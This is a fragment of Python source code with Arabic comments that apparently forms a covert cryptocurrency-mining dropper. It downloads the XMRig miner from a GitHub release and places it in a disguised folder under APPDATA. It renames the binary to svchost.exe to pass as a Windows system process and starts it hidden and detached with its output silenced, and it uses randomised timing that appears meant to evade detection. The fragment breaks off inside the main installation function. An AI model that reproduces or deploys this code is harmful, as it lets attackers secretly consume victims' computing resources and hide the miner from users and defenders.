def get_stealth_path():
    appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
    stealth_dir = os.path.join(appdata, "Microsoft", "Windows", "Caches")
    os.makedirs(stealth_dir, exist_ok=True)
    return stealth_dir

def download_file(url, dest):
    """تحميل ملف باستخدام urllib (بدون requests)"""
    try:
        urllib.request.urlretrieve(url, dest)
        return True
    except Exception as e:
        print(f"[!] فشل التحميل: {e}")
        return False

def kill_miner_process(proc):
    """إنهاء العملية وجميع أطفالها باستخدام taskkill (بدون psutil)"""
    try:
        subprocess.run(["taskkill", "/F", "/T", "/PID", str(proc.pid)], capture_output=True, check=True)
    except:
        try:
            proc.kill()
        except:
            pass

def run_miner(miner_path, config_path, cwd):
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE
    return subprocess.Popen(
        [miner_path, "-c", config_path],
        cwd=cwd,
        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
        startupinfo=startupinfo,
        close_fds=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        shell=False
    )

def get_gaussian_duration(mean, std_dev, min_val, max_val):
    val = int(random.gauss(mean, std_dev))
    return max(min_val, min(max_val, val))

def golden_hammer_mission():
    install_dir = get_stealth_path()
    miner_folder = os.path.join(install_dir, "xmrig-6.21.0")
    miner_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
    zip_path = os.path.join(install_dir, "miner.zip")
    new_exe_name = "svchost.exe"
    new_exe_path = os.path.join(miner_folder, new_exe_name)

    # تحميل وتجهيز برنامج التعدين
    if not os.path.exists(new_exe_path):
